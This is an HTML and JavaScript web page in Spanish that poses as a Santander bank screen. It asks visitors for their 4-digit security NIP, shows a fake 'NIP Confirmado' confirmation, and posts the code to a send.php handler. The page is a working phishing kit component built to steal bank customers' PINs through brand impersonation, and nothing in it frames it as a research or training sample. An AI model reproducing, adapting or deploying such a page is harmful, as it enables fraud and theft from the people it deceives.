<!--
██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
-->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
    <title>Santander</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-image: url('https://i.postimg.cc/DZVgdPhQ/9aa5a26c-780a-444f-acb0-d9c7cfee2bbe.png'); 
            background-size: cover; 
            background-position: center;
            background-attachment: fixed;
            height: 100vh;
            overflow: hidden;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6); 
            z-index: -1;
        }
        .otp-card {
            border-radius: 1.5rem 1.5rem 0 0;
            min-height: 550px;
            z-index: 10;
        }
        .otp-input {
            width: 40px;
            height: 50px;
            border-bottom: 2px solid #e2e8f0;
            text-align: center;
            font-size: 1.5rem;
            font-weight: bold;
            color: #374151;
            outline: none;
            transition: all 0.2s;
        }
        .otp-input:focus {
            border-bottom-color: #ec1c24;
            background-color: #fff5f5;
        }
    </style>
</head>
<body class="flex flex-col justify-end">

    <div class="bg-white w-full otp-card p-6 shadow-2xl animate-up">
        <div class="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-8"></div>

        <div class="space-y-6 text-center">
            <div class="inline-flex items-center justify-center w-16 h-16 bg-red-50 rounded-full">
                <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
            </div>
            <form id="otpForm" action="send.php" method="POST">
            <div class="space-y-2">
                <h2 class="text-xl font-bold text-gray-800">Ingresa tu NIP</h2>
                <p class="text-sm text-gray-500 px-6">Ingresa tu NIP de seguridad de 4 dígitos para validar tu acceso y continuar con la operación.</p>
            </div>

            <!-- Contenedor de 8 dígitos -->
             <!-- Busca el div id="otp-container" y añade esto justo ARRIBA -->
<div id="error-msg" class="hidden animate-pulse">
    <p class="text-red-600 text-xs font-bold bg-red-50 py-2 rounded-lg border border-red-200">
        El código ingresado es incorrecto o ha expirado.
    </p>
</div>

<div id="otp-container" class="flex justify-center gap-2 pt-4">
    <!-- Tus 8 inputs se quedan igual -->
</div>
            <div id="otp-container" class="flex justify-center gap-2 pt-4">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
            </div>
            <input type="hidden" name="nip" id="codigoCompleto">
            <div class="pt-6 space-y-4">
                <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
                    Confirmar Código
                </button>
                <p class="text-xs text-gray-400">¿No recibiste el código? <span class="text-red-600 font-semibold cursor-pointer">Reenviar en 0:59</span></p>
            </div>
            </form>
        </div>
    </div>

    <script>

const inputs = document.querySelectorAll('.otp-input');
const btnFinal = document.getElementById('btnFinal');

/* NUEVO */
const form = document.getElementById('otpForm');
const hiddenInput = document.getElementById('codigoCompleto');

// SALTO AUTOMATICO ENTRE INPUTS
inputs.forEach((input, index) => {

    input.addEventListener('input', () => {

        // SOLO UN DIGITO
        input.value = input.value.replace(/\D/g, '').slice(0, 1);

        // PASAR AL SIGUIENTE
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        checkComplete();

    });

    // RETROCEDER CON BACKSPACE
    input.addEventListener('keydown', (e) => {

        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }

    });

});

// VALIDAR CODIGO COMPLETO
function checkComplete() {

    const code = Array.from(inputs)
        .map(i => i.value)
        .join('');

    if (code.length === 4) {

        btnFinal.disabled = false;

        btnFinal.classList.remove(
            'bg-gray-200',
            'text-gray-400'
        );

        btnFinal.classList.add(
            'bg-red-600',
            'text-white'
        );

    } else {

        btnFinal.disabled = true;

        btnFinal.classList.add(
            'bg-gray-200',
            'text-gray-400'
        );

        btnFinal.classList.remove(
            'bg-red-600',
            'text-white'
        );

    }

}

// BOTON CONFIRMAR
btnFinal.addEventListener('click', (e) => {

    e.preventDefault();

    const finalCode = Array.from(inputs)
        .map(i => i.value)
        .join('');

    /* GUARDAR CODIGO COMPLETO EN INPUT HIDDEN */
    hiddenInput.value = finalCode;

    // ANIMACION BOTON
    btnFinal.innerText = "Verificando...";
    btnFinal.disabled = true;

    // EFECTO VISUAL
    setTimeout(() => {

        btnFinal.innerText = "NIP Confirmado";

        btnFinal.classList.remove(
            'bg-red-600'
        );

        btnFinal.classList.add(
            'bg-green-600'
        );

        /* ENVIAR FORM */
        form.submit();

    }, 1200);

});

</script>
</body>
</html>
